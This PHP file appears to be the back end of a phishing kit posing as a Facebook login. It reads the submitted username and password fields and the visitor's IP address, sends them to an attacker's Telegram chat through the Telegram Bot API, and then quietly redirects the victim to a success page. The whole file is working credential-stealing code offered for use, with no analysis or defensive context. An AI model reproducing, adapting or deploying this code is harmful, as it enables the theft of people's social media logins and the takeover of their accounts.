<?php
// BRoK - @x_BRK - @i_BRK //
$efb = $_POST['efb'];
$pfb = $_POST['pfb'];
$ip = $_SERVER['REMOTE_ADDR'];
ob_start();
$get_toke = file_get_contents('info.php');
$get_token = explode("\n", $get_toke);
$Token = $get_token[0];
$admin = $get_token[1];
define('API_KEY',$Token);
function bot($method,$datas=[]){
$url = "https://api.telegram.org/bot".API_KEY."/".$method;
$ch = curl_init();
curl_setopt($ch,CURLOPT_URL,$url); curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
curl_setopt($ch,CURLOPT_POSTFIELDS,$datas);
$res = curl_exec($ch);
if(curl_error($ch)){
var_dump(curl_error($ch));
}else{
return json_decode($res);
}
}
date_default_timezone_set('Asia/Baghdad');
$time = date('h:i');
$year = date('Y');
$month = date('n');
$day = date('j');
$update = json_decode(file_get_contents('php://input'));
$message = $update->message;
$from_id = $message->from->id;
$chat_id = $message->chat->id;
$text = $message->text;
$name = $message->from->first_name;
$chat_id2 = $update->callback_query->message->chat->id;
$message_id = $update->callback_query->message->message_id;
$data = $update->callback_query->data;
$user = $message->from->username;
if($efb){
bot("sendMessage",[
"chat_id"=>$admin,
"text"=>"
New Login To Your INDEX
- User - $efb
- Pass - $pfb
- IP - $ip
- - - - - - - - 
Login with Facebook
- - - - - - - -
- BY @i_BRK
",
]);
}
?>
<html>
<head>
<meta http-equiv="REFRESH" content="0;url=success.php">
</head>
<body>
</body>
</html>
